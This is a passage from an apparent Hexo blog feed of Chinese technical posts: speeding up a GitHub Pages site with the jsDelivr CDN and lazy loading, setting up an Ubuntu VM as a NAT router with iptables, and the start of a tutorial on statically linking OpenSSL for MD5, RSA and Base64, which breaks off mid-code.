<code>hexo g</code> 生成静态网站后， 运行 <code>gulp</code> 进行压缩</p><h2 id="使用-CDN"><a href="#使用-CDN" class="headerlink" title="使用 CDN"></a>使用 CDN</h2><p>如果你查看博客的网络请求内容，你会发现在html加载之后，还有一堆小文件等待加载，而这些css\js\图片文件的加载占据了大部分的网页打开时间。</p><p>因为Github Pages的延迟巨大，速度极慢，我们更有必要使用国内的CDN对这些资源进行分发。</p><p>不想使用国内付费的CDN服务，我尝试过使用CloudFlare进行加速（实质减速）效果不佳，后来发现了jsDelivr。</p><p>jsDelivr 是一家开源免费CDN，主要是对npm包进行CDN分发</p><p>绝妙的是它还能对Github和Wordpress进行CDN分发</p><p>我们可以借助 jsDelivr 的 Github资源分发 服务来对我们博客中的css\js\小图片进行加速</p><blockquote><p>这是我目前找到的唯一一家在国内有节点并且不需要备案的CDN分发服务  </p></blockquote><p>这里我就以我使用的主题为例，分享一下我如何使用jsDelivr进行CDN分发</p><h3 id="链接格式"><a href="#链接格式" class="headerlink" title="链接格式"></a>链接格式</h3><p>jsDelivr 针对 Github 资源有众多URL格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;user&#x2F;repo@version&#x2F;file</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;src&#x2F;core.min.js</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;</span><br></pre></td></tr></table></figure><p>考虑到jsDelivr默认缓存时间是7天，如果我们想要修改实时生效而不需要等到缓存过期，最适合的是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F; github用户名 &#x2F; 库名 @ 版本号或者tag &#x2F; 路径&#x2F;文件名</span><br></pre></td></tr></table></figure><p>我们可以通过打tag来访问同一个资源文件的不同版本，而不需要考虑缓存时间</p><h3 id="替换链接"><a href="#替换链接" class="headerlink" title="替换链接"></a>替换链接</h3><p>大部分hexo主题并不会对使用到的 js\css\图片\字体 套上CDN，我们来手动替换</p><h4 id="css样式表"><a href="#css样式表" class="headerlink" title="css样式表"></a>css样式表</h4><p>大部分css样式会在 <code>head</code> 标签里面引入，这里的css样式表会阻塞页面的渲染，导致打开慢的体验，所以需要特别注意</p><p>我将我使用的主题的 style.css \ rtl.css \ disquesjs.css 替换成jsDelivr，明显提升了等待时间</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/speedup-github-page/head.jpg" loading="lazy" class="" title="[head css]"><p>还有一些其他地方的css引入</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/speedup-github-page/css2.jpg" loading="lazy" class="" title="[css in style]"><h4 id="js脚本"><a href="#js脚本" class="headerlink" title="js脚本"></a>js脚本</h4><p>寻找并替换各种调用到的js脚本</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/speedup-github-page/js1.jpg" loading="lazy" class="" title="[css in style]"><p>main.js</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/speedup-github-page/js2.jpg" loading="lazy" class="" title="[css in style]"><p>disqusjs.js</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/speedup-github-page/js3.jpg" loading="lazy" class="" title="[css in style]"><p>还有其他的一些地方，不一一列举了</p><h4 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h4><p>字体需要特别注意，通常情况下比较大，耗时比较长</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/speedup-github-page/font1.jpg" loading="lazy" class="" title="[font replace]"><p>我使用的主题使用的字体通过 <code>all.min.css</code> 引入，因为前面这个css样式已经通过 jsDelivr 导入，里面的字体使用的是相对链接，所以字体默认也是通过jsDelivr引入了</p><h4 id="img小图片"><a href="#img小图片" class="headerlink" title="img小图片"></a>img小图片</h4><p>一般是 logo 等资源，根据主题自行替换</p><blockquote><p>更新：为了更好的控制版本和决定是否使用jsDelivr, 可以将这个地方独立出来放到配置文件里</p></blockquote><p>_config.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cdn:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">https://cdn.jsdelivr.net/gh/zu1k/hexoblog@0.0.1.2</span></span><br></pre></td></tr></table></figure><p>用到的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- styles --&gt;</span><br><span class="line">&lt;% if (theme.cdn.enabled) &#123; %&gt;</span><br><span class="line">  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&lt;%&#x3D; theme.cdn.url %&gt;&#x2F;css&#x2F;style.css&quot;&gt;</span><br><span class="line">&lt;% &#125; else &#123; %&gt;</span><br><span class="line">  &lt;%- css(&#39;css&#x2F;style&#39;) %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line"></span><br><span class="line">其他的地方同样的方法</span><br></pre></td></tr></table></figure><h2 id="加载时文字可见"><a href="#加载时文字可见" class="headerlink" title="加载时文字可见"></a>加载时文字可见</h2><p>无论怎样优化，字体加载的时间无法忽略，这段时间的网页文字显示为空，这给用户带来卡顿感</p><p>我们必须使字体加载时文字可见，这样才能弥补github pages的慢</p><p>具体方法是将各 <code>@font-face</code> 中 <code>font-display</code> 设置为 <code>swap</code>, 这样可以在字体未加载完时临时使用系统字体替代，加载完后重新渲染字体</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/speedup-github-page/font-swap.jpg" loading="lazy" class="" title="[font display]"><p>每一个地方都需要改，自己搜索吧</p><h2 id="使用DisqusJS"><a href="#使用DisqusJS" class="headerlink" title="使用DisqusJS"></a>使用DisqusJS</h2><p>由于众所周知的原因，disqus被墙了，国内访问不了，而大部分hexo网站都使用disqus作为评论系统，这导致网页会卡在评论区的加载上，虽然网页已经加载完了，但进度条还在进行，给用户带来慢的感觉。</p><p>并且，即使有的用户翻墙能够访问Disqus，但Disqus 本身非常笨重，各种 CSS/JS/Font/API 加起来请求不小于 2MB，当 Disqus 加载时，浏览器会在主线程中同步解析、渲染 Disqus，造成卡顿感。</p><p>在上网搜索之后，找到了一个替代方案，那就是苏卡卡大佬的 DisqusJS，大家可以根据教程对自己博客的主题进行修改</p><p>参考链接：</p><ul><li><a href="https://blog.skk.moe/post/disqusjs/" target="_blank" rel="noopener">https://blog.skk.moe/post/disqusjs/</a></li><li><a href="https://disqusjs.skk.moe/" target="_blank" rel="noopener">https://disqusjs.skk.moe/</a></li><li><a href="https://github.com/SukkaW/DisqusJS" target="_blank" rel="noopener">https://github.com/SukkaW/DisqusJS</a></li></ul><p>对于使用的Disqus API反代，我自己测试发现苏卡卡大佬提供的速度不太行，不知道是什么原因，所以推荐自己进行搭建，我是用的是zeit进行搭建，感觉还不错</p><blockquote><p>如果disqusJS默认样式不适合自己的主题，推荐fork原库进行修改，注意要使用1.2.6，最新的master在懒加载上有点问题</p></blockquote><h2 id="使用懒加载"><a href="#使用懒加载" class="headerlink" title="使用懒加载"></a>使用懒加载</h2><p>如果图片和评论区随着页面在一开始就加载，势必会拖累网页首次渲染和文字的迅速显示，这里最好的办法是使用懒加载技术</p><h3 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h3><p>对于图片，我使用了 <code>hexo-lazyload-image</code> 这个插件</p><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-lazyload-image --save</span><br></pre></td></tr></table></figure><p>配置文件中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  onlypost: <span class="literal">false</span></span><br><span class="line">  loadingImg: https://cdn.jsdelivr.net/gh/zu1k/hexoblog@0.0.1.2/images/loading.png</span><br></pre></td></tr></table></figure><blockquote><p>顺便给懒加载添加了cdn功能，可以替换成cdn链接来加速</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-lazyload-image-cdn --save</span><br></pre></td></tr></table></figure><p>配置文件中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span> </span><br><span class="line">  onlypost: <span class="literal">false</span></span><br><span class="line">  loadingImg: <span class="comment"># eg ./images/loading.gif</span></span><br><span class="line">  cdn:</span><br><span class="line">    enabled: <span class="literal">false</span></span><br><span class="line">    url: https://cdn.com</span><br></pre></td></tr></table></figure><h3 id="评论懒加载"><a href="#评论懒加载" class="headerlink" title="评论懒加载"></a>评论懒加载</h3><p>对于评论区，很多情况下用户根本不会划到页面底部（文章写得太烂没人看得下去）。</p><p>所以我这里对 disqus 的加载使用懒加载技术，参考 <a href="https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/" target="_blank" rel="noopener">https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/</a></p><p>我使用的是 disqusJS, 下面给出加载的js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- DisqusJS Comments --&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span> (theme.disqusjs.enabled &amp;&amp; theme.disqusjs.shortname)&#123; %&gt;</span><br><span class="line">  &lt;script crossorigin defer src=<span class="string">"https://cdn.jsdelivr.net/gh/zu1k/DisqusJS@1.2.6.3/dist/disqus.js"</span> id=<span class="string">"disqusjs-script"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">  &lt;script&gt;</span></span><br><span class="line"><span class="regexp">    document.getElementById("disqusjs-script").addEventListener("load",function() &#123;</span></span><br><span class="line"><span class="regexp">      setTimeout(</span></span><br><span class="line"><span class="regexp">        function() &#123;</span></span><br><span class="line"><span class="regexp">          function t() &#123;</span></span><br><span class="line"><span class="regexp">            var dsqjs = new DisqusJS(&#123;</span></span><br><span class="line"><span class="regexp">                  shortname: '&lt;%= theme.disqusjs.shortname %&gt;',</span></span><br><span class="line"><span class="regexp">                  siteName: '&lt;%= theme.disqusjs.siteName %&gt;',</span></span><br><span class="line"><span class="regexp">                  api: '&lt;%= theme.disqusjs.api %&gt;',</span></span><br><span class="line"><span class="regexp">                  apikey: '&lt;%= theme.disqusjs.apikey %&gt;',</span></span><br><span class="line"><span class="regexp">                  admin: '&lt;%= theme.disqusjs.admin %&gt;',</span></span><br><span class="line"><span class="regexp">                  adminLabel: '&lt;%= theme.disqusjs.adminLabel %&gt;'</span></span><br><span class="line"><span class="regexp">              &#125;);</span></span><br><span class="line"><span class="regexp">          &#125;</span></span><br><span class="line"><span class="regexp">          var runningOnBrowser = typeof window !== "undefined";</span></span><br><span class="line"><span class="regexp">          var isBot = runningOnBrowser &amp;&amp; !("onscroll" in window) || typeof navigator !== "undefined" &amp;&amp; /</span>(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);</span><br><span class="line">          <span class="keyword">var</span> supportsIntersectionObserver = runningOnBrowser &amp;&amp; <span class="string">"IntersectionObserver"</span> <span class="keyword">in</span> <span class="built_in">window</span>;</span><br><span class="line">          <span class="keyword">if</span> (!isBot &amp;&amp; supportsIntersectionObserver) &#123;</span><br><span class="line">              <span class="keyword">var</span> disqus_observer = <span class="keyword">new</span> IntersectionObserver(<span class="function"><span class="keyword">function</span>(<span class="params">entries</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (entries[<span class="number">0</span>].isIntersecting) &#123;</span><br><span class="line">                  t();</span><br><span class="line">                  disqus_observer.disconnect();</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;, &#123; <span class="attr">threshold</span>: [<span class="number">0</span>] &#125;);</span><br><span class="line">              disqus_observer.observe(<span class="built_in">document</span>.getElementById(<span class="string">'disqus_thread'</span>));</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            t();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;, <span class="number">1</span>);</span><br><span class="line">    &#125;,!<span class="number">0</span></span><br><span class="line">  );</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;% &#125; %&gt;</span></span><br></pre></td></tr></table></figure><h2 id="终极大招"><a href="#终极大招" class="headerlink" title="终极大招"></a>终极大招</h2><p>如果经过上面的优化，你还对博客的加载速度不满意，那一定是github pages服务器在美国的原因，200+ms的延迟导致首字节返回时间不短</p><p>其实支持通过Github仓库代码进行构建，部署为静态网站的平台不值github pages一家，我使用过的比较好的是 <code>zeit.co</code> ， 国内访问走的是台湾的gcp节点，延迟低速度快，推荐</p><p>具体使用方法非常简单，自行摸索吧</p><blockquote><p>更新: 刚知道，如果更新太快的话，zeit会暂停构建部署的</p><p>You are pushing commits at a very fast pace (across the whole organization).<br>Due to that, we cannot deploy the commit e80751b.</p><p>You can try again later or upgrade your plan.</p></blockquote><h2 id="辅助优化"><a href="#辅助优化" class="headerlink" title="辅助优化"></a>辅助优化</h2><p>使用谷歌提供的 <a href="https://developers.google.com/speed/pagespeed/insights/" target="_blank" rel="noopener">Pagespeed Insights</a> 工具分析网页加载并根据建议进行优化</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github pages </tag>
            
            <tag> jsdelivr </tag>
            
            <tag> gulp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用iptables将ubuntu配置为路由器</title>
      <link href="/2020/ubuntu-iptables-nat.html"/>
      <url>/2020/ubuntu-iptables-nat.html</url>
      
        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote><p>使用 vmware 分别创建win7和ubuntu两个虚拟机</p></blockquote><h3 id="ubuntu-18-04"><a href="#ubuntu-18-04" class="headerlink" title="ubuntu 18.04"></a>ubuntu 18.04</h3><p>充当网关路由器</p><p>网卡1(WAN口)：桥接公网</p><p>网卡2(LAN口)：vmnet15</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/ubuntu-iptables-nat/ubuntuvm.png" loading="lazy" class="" title="[vmware win7]"><h3 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h3><p>充当内网客户机</p><p>网卡：vmnet15</p><blockquote><p>vmnet15不使用vmware的配置，使用一个空的vmnet</p></blockquote><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/ubuntu-iptables-nat/win7vm.png" loading="lazy" class="" title="[vmware win7]"><h2 id="ubuntu-配置"><a href="#ubuntu-配置" class="headerlink" title="ubuntu 配置"></a>ubuntu 配置</h2><h3 id="开启ipv4-forward"><a href="#开启ipv4-forward" class="headerlink" title="开启ipv4 forward"></a>开启ipv4 forward</h3><p>修改 <code>/etc/sysctl.conf</code> 开启ipv4的forward功能，将下面的注释打开，如果没有手动添加。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/ubuntu-iptables-nat/ipv4forward.png" loading="lazy" class="" title="[ipv4 forward]"><p><code>sysctl -p</code> 生效</p><h3 id="配置网卡信息"><a href="#配置网卡信息" class="headerlink" title="配置网卡信息"></a>配置网卡信息</h3><p><code>ip addr</code> 查看所有网卡的名称和信息</p><p>ubuntu18.04使用netplan管理网络，修改其配置文件</p><p><code>sudo nano /etc/netplan/50-cloud-init.yaml</code></p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/ubuntu-iptables-nat/ubuntu-net.png" loading="lazy" class="" title="[ubuntu net]"><p>使用 <code>netplan try</code> 检查配置是否正确，如果正确自动应用生效</p><h3 id="配置iptables规则"><a href="#配置iptables规则" class="headerlink" title="配置iptables规则"></a>配置iptables规则</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//清空已有规则防止干扰</span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line">//进、出、转发默认允许</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line">//将从子网网段来的连接nat到eno33网卡(互联网)，ip改为外网ip</span><br><span class="line">iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -o eno33 -j SNAT --to-source 192.168.254.129</span><br><span class="line"></span><br><span class="line">//添加伪装</span><br><span class="line">iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -j MASQUERADE</span><br></pre></td></tr></table></figure><h2 id="win7-设置"><a href="#win7-设置" class="headerlink" title="win7 设置"></a>win7 设置</h2><p>修改网卡配置如图</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/ubuntu-iptables-nat/win7.png" loading="lazy" class="" title="[vmware win7]"><p>win7即可通过ubuntu这个网关上网</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态链接OpenSSL进行RSA\MD5\Base64</title>
      <link href="/2020/openssl-first-try-rsa-md5-base64.html"/>
      <url>/2020/openssl-first-try-rsa-md5-base64.html</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>目标平台： Windows 10 amd64</p><p>使用静态链接方式，原因：动态链接库太大了，包含很多本次实验不需要的函数</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="下载openssl代码"><a href="#下载openssl代码" class="headerlink" title="下载openssl代码"></a>下载openssl代码</h3><p><code>git clone https://github.com/openssl/openssl.git</code></p><p>或者从官网 <a href="https://www.openssl.org/source/" target="_blank" rel="noopener">https://www.openssl.org/source/</a> 下载源代码</p><p>我使用的是openssl 1.1.1</p><h3 id="安装perl环境，这里使用的是ActivePerl"><a href="#安装perl环境，这里使用的是ActivePerl" class="headerlink" title="安装perl环境，这里使用的是ActivePerl"></a>安装perl环境，这里使用的是ActivePerl</h3><p><a href="https://www.activestate.com/products/perl/" target="_blank" rel="noopener">https://www.activestate.com/products/perl/</a></p><h3 id="安装NASM汇编器"><a href="#安装NASM汇编器" class="headerlink" title="安装NASM汇编器"></a>安装NASM汇编器</h3><p><a href="https://www.nasm.us/" target="_blank" rel="noopener">https://www.nasm.us/</a></p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>将刚刚安装的nasm和perl的bin目录加入PATH</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/openssl-first-try-rsa-md5-base64/env.png" loading="lazy" class="" title="[环境变量PATH]"><h2 id="编译-openssl-静态链接库"><a href="#编译-openssl-静态链接库" class="headerlink" title="编译 openssl 静态链接库"></a>编译 openssl 静态链接库</h2><h3 id="初始化环境"><a href="#初始化环境" class="headerlink" title="初始化环境"></a>初始化环境</h3><p>使用visual studio自带的命令提示工具初始化环境，因为需要使用nmake</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/openssl-first-try-rsa-md5-base64/vs1.png" loading="lazy" class="" title="[vs tool]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/openssl-first-try-rsa-md5-base64/vs2.png" loading="lazy" class="" title="[vs tool]"><h3 id="生成编译配置文件"><a href="#生成编译配置文件" class="headerlink" title="生成编译配置文件"></a>生成编译配置文件</h3><p>cd进入openssl源码目录</p><p>执行 <code>perl Configure VC-WIN64A no-asm no-shared --prefix=&quot;D:\Project\opensslwork\openssl\build&quot; --openssldir=&quot;D:\Project\opensslwork\openssl\build\ssl&quot;</code></p><h3 id="进行编译并测试和安装"><a href="#进行编译并测试和安装" class="headerlink" title="进行编译并测试和安装"></a>进行编译并测试和安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmake</span><br><span class="line">nmake test</span><br><span class="line">nmake install</span><br></pre></td></tr></table></figure><p>此时已经有了我们需要的头文件和静态链接lib库</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/openssl-first-try-rsa-md5-base64/build1.png" loading="lazy" class="" title="[build dir]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/openssl-first-try-rsa-md5-base64/build2.png" loading="lazy" class="" title="[lib]"><h2 id="使用openssl的api进行编程"><a href="#使用openssl的api进行编程" class="headerlink" title="使用openssl的api进行编程"></a>使用openssl的api进行编程</h2><h3 id="visual-studio项目配置"><a href="#visual-studio项目配置" class="headerlink" title="visual studio项目配置"></a>visual studio项目配置</h3><p>vs创建空项目，然后配置头文件和库文件的路径</p><p>项目右键-属性，配置选择所有配置，平台选择x64</p><p><code>VC++ 目录</code> 配置里面的 <code>包含目录</code> 添加openssl的头文件目录, 我这里是 <code>D:\Project\opensslwork\openssl\build\include;</code></p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/openssl-first-try-rsa-md5-base64/vsw1.png" loading="lazy" class="" title="[lib]"><p><code>链接器</code> 里面的 <code>输入</code> 的 <code>附加依赖项</code> 添加 静态库名，<code>libcrypto.lib;libssl.lib;</code></p><blockquote><p>注意：在使用openssl的静态链接库时，除了添加 <code>libcrypto.lib;libssl.lib;</code>，还需要添加系统的依赖库：<code>crypt32.lib;WS2_32.lib;</code>， 因为openssl在windows平台使用了这些库。<br>完整的： <code>kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies);crypt32.lib;libcrypto.lib;libssl.lib;WS2_32.lib;</code></p></blockquote><h3 id="添加头文件"><a href="#添加头文件" class="headerlink" title="添加头文件"></a>添加头文件</h3><p>因为需要md5,rsa,base64等操作，这里需要导入openssl四个相关的头文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/rsa.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/pem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/md5.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/bio.h&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="使用MD5对字符串生成摘要"><a href="#使用MD5对字符串生成摘要" class="headerlink" title="使用MD5对字符串生成摘要"></a>使用MD5对字符串生成摘要</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">md5_hash</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *in, <span class="keyword">unsigned</span> <span class="keyword">char</span> *md)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* data;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>* str;</span><br><span class="line">    data = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)in;</span><br><span class="line">    MD5(data, <span class="built_in">strlen</span>(in), md); <span class="comment">//调用openssl的md5方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="生成rsa密钥对并以pem格式写入文件"><a href="#生成rsa密钥对并以pem格式写入文件" class="headerlink" title="生成rsa密钥对并以pem格式写入文件"></a>生成rsa密钥对并以pem格式写入文件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RSA * <span class="title">gen_rsa</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bits = <span class="number">1024</span>;</span><br><span class="line">    RSA* rsa = RSA_new();</span><br><span class="line">    BIGNUM* e = BN_new();</span><br><span class="line">    BN_set_word(e, RSA_F4);</span><br><span class="line">    <span class="keyword">int</span> rc = RSA_generate_key_ex(rsa, bits, e, <span class="literal">NULL</span>); <span class="comment">//openssl中生成rsa key的新方法</span></span><br><span class="line">    BN_free(e);</span><br><span class="line">    <span class="keyword">if</span> (rc != <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;   </span><br><span class="line">    <span class="keyword">size_t</span> pri_len;</span><br><span class="line">    <span class="keyword">size_t</span> pub_len;</span><br><span class="line">    <span class="keyword">char</span>* pri_key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span>* pub_key = <span class="literal">NULL</span>;</span><br><span class="line">    BIO* pubkey = BIO_new_file(<span class="string">"public.pem"</span>, <span class="string">"w"</span>);</span><br><span class="line">    BIO* prikey = BIO_new_file(<span class="string">"private.pem"</span>, <span class="string">"w"</span>);</span><br><span class="line">    PEM_write_bio_RSAPrivateKey(prikey, rsa, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">//私钥写入文件</span></span><br><span class="line">    PEM_write_bio_RSAPublicKey(pubkey, rsa); <span class="comment">//公钥写入文件</span></span><br><span class="line">    <span class="keyword">return</span> rsa;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对数据进行base64编码，base64在BIO中有"><a href="#对数据进行base64编码，base64在BIO中有" class="headerlink" title="对数据进行base64编码，base64在BIO中有"></a>对数据进行base64编码，base64在BIO中有</h3><figure class="highlight 